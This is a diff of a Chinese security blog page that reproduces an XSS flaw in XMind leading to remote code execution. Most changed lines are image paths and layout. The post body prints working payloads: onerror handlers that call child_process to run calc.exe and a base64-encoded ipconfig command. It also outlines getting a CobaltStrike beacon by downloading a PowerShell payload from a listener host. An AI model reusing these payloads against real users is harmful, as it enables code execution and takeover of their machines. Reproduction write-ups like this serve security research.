@@ -17,7 +17,7 @@
 
 
     <title>XMind思维导图XSS漏洞复现 | Salute&#39;s blogs</title>
-    <link rel="icon" type="image/jpeg" href="/salute.jpg">
+    <link rel="icon" type="image/jpeg" href="/medias/hh.jpg">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
     <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
@@ -29,9 +29,9 @@
 
     <script src="/libs/jquery/jquery.min.js"></script>
 
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Salute's blogs" type="application/atom+xml">
-
+<meta name="generator" content="Hexo 5.4.0">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="Salute's blogs" type="application/atom+xml">
 <link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
 
 
@@ -50,7 +50,7 @@
             <div class="brand-logo">
                 <a href="/" class="waves-effect waves-light">
                     
-                    <img src="/medias/hh.jpg" class="logo-img" alt="LOGO">
+                    <img src="/medias/salute.jpg" class="logo-img" alt="LOGO">
                     
                     <span class="logo-span">Salute&#39;s blogs</span>
                 </a>
@@ -149,7 +149,7 @@
 
     <div class="mobile-head bg-color">
         
-        <img src="/medias/hh.jpg" class="logo-img circle responsive-img">
+        <img src="/medias/salute.jpg" class="logo-img circle responsive-img">
         
         <div class="logo-name">Salute&#39;s blogs</div>
         <div class="logo-desc">
@@ -480,7 +480,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-05-17
+                    2021-05-20
                 </div>
                 
 
@@ -515,12 +515,12 @@
 <h2 id="1-打开XMind新建思维导图，进入大纲，测试基本xss代码。"><a href="#1-打开XMind新建思维导图，进入大纲，测试基本xss代码。" class="headerlink" title="1.打开XMind新建思维导图，进入大纲，测试基本xss代码。"></a>1.打开XMind新建思维导图，进入大纲，测试基本xss代码。</h2><p>payload：</p>
 <pre class=" language-html"><code class="language-html">&lt;img src=# onerror=alert('1')>
 </code></pre>
-<p><img src="../images/4.png"></p>
+<p><img src="../images/XMind%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BEXSS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png"></p>
 <p><strong>注意</strong>：执行代码时，将光标放到语句最后，按空间键或者CTRL触发XSS执行</p>
 <h2 id="2-测试RCE命令，我们通过打开计算器来展示。"><a href="#2-测试RCE命令，我们通过打开计算器来展示。" class="headerlink" title="2.测试RCE命令，我们通过打开计算器来展示。"></a>2.测试RCE命令，我们通过打开计算器来展示。</h2><p>payload：</p>
 <pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>1</span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>require(<span class="token punctuation">'</span>child_process<span class="token punctuation">'</span>).exec(<span class="token punctuation">'</span>calc.exe<span class="token punctuation">'</span>,null);<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
 </code></pre>
-<p><img src="../images/5.png"></p>
+<p><img src="../images/XMind%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BEXSS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png"></p>
 <h2 id="3-接着我们构造payload来查看我们相关配置，这里我们查看网络设置"><a href="#3-接着我们构造payload来查看我们相关配置，这里我们查看网络设置" class="headerlink" title="3.接着我们构造payload来查看我们相关配置，这里我们查看网络设置"></a>3.接着我们构造payload来查看我们相关配置，这里我们查看网络设置</h2><p>payload：</p>
 <pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>#</span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>eval(new Buffer(`cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2lwY29uZmlnIC9hbGwnLChlcnJvciwgc3Rkb3V0LCBzdGRlcnIpPT57CiAgICBhbGVydChgc3Rkb3V0OiAke3N0ZG91dH1gKTsKICB9KTs<span class="token punctuation">=</span>`,`base64`).toString())<span class="token punctuation">'</span></span><span class="token punctuation">></span></span>
 </code></pre>
@@ -530,12 +530,12 @@
 <pre class=" language-markdown"><code class="language-markdown">require('child_process').exec('ipconfig /all',(error, stdout, stderr)=>{    alert(<span class="token code keyword">`stdout: ${stdout}`</span>);
   });
 </code></pre>
-<p><img src="../images/6.png"></p>
-<h2 id="4-上线CobaltStrike"><a href="#4-上线CobaltStrike" class="headerlink" title="4.上线CobaltStrike"></a>4.上线CobaltStrike</h2><p><img src="../images/7.png"></p>
+<p><img src="../images/XMind%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BEXSS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png"></p>
+<h2 id="4-上线CobaltStrike"><a href="#4-上线CobaltStrike" class="headerlink" title="4.上线CobaltStrike"></a>4.上线CobaltStrike</h2><p><img src="../images/XMind%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BEXSS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png"></p>
 <p>（1）首先我们生成一个powershell command的payload</p>
-<p><img src="../images/8.png"></p>
+<p><img src="../images/XMind%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BEXSS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png"></p>
 <p>（2）接着我们利用cs的远程文件下载模块编辑远程下载url</p>
-<p><img src="../images/9.png"></p>
+<p><img src="../images/XMind%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BEXSS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png"></p>
 <p> 生成的url为：</p>
 <pre class=" language-http"><code class="language-http"><span class="token header-name keyword">http:</span>//你设置的监听器IP:80/download/file.ext
 </code></pre>
@@ -550,7 +550,7 @@
 </code></pre>
 <p>其中我们可以在command处进行目录执行，我们就将我们的cs执行码输入进去，但是要记得用base64进行编码</p>
 <p>接着我们就看到cs上线成功</p>
-<p><img src="../images/10.png"></p>
+<p><img src="../images/XMind%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BEXSS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png"></p>
 
                 
             </div>
@@ -559,41 +559,6 @@
             
 
     <div class="reprint" id="reprint-statement">
-        
-            <div class="reprint__author">
-                <span class="reprint-meta" style="font-weight: bold;">
-                    <i class="fas fa-user">
-                        文章作者:
-                    </i>
-                </span>
-                <span class="reprint-info">
-                    <a href="/about" rel="external nofollow noreferrer">sererdipity</a>
-                </span>
-            </div>
-            <div class="reprint__type">
-                <span class="reprint-meta" style="font-weight: bold;">
-                    <i class="fas fa-link">
-                        文章链接:
-                    </i>
-                </span>
-                <span class="reprint-info">
-                    <a href="https://salute-s.github.io/2021/05177225.html">https://salute-s.github.io/2021/05177225.html</a>
-                </span>
-            </div>
-            <div class="reprint__notice">
-                <span class="reprint-meta" style="font-weight: bold;">
-                    <i class="fas fa-copyright">
-                        版权声明:
-                    </i>
-                </span>
-                <span class="reprint-info">
-                    本博客所有文章除特別声明外，均采用
-                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
-                    许可协议。转载请注明来源
-                    <a href="/about" target="_blank">sererdipity</a>
-                    !
-                </span>
-            </div>
         
     </div>
 
@@ -1062,18 +1027,17 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2021/05177225.html">
+                <a href="/2021/052038006.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="XMind思维导图XSS漏洞复现">
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="Centos7部署PHP+Mysql+Apache">
                         
-                        <span class="card-title">XMind思维导图XSS漏洞复现</span>
+                        <span class="card-title">Centos7部署PHP+Mysql+Apache</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1083,37 +1047,16 @@
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-05-17
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-05-20
+                        </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
-                                    漏洞复现
-                                </a>
-                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Sererdipity
                             
                         </span>
                     </div>
-                </div>
-
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
-                        <span class="chip bg-color">漏洞复现</span>
-                    </a>
-                    
-                    <a href="/tags/XSS/">
-                        <span class="chip bg-color">XSS</span>
-                    </a>
-                    
-                    <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
-                        <span class="chip bg-color">渗透测试</span>
-                    </a>
-                    
                 </div>
                 
             </div>
@@ -1221,8 +1164,6 @@
 
 <!-- 代码语言 -->
 
-<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
-
 
 <!-- 代码块复制 -->
 
@@ -1244,6 +1185,12 @@
 </div>
 
 <!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
 
 
 <script src="/libs/tocbot/tocbot.min.js"></script>
@@ -1283,6 +1230,41 @@
             }
         });
 
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
         
     });
 </script>
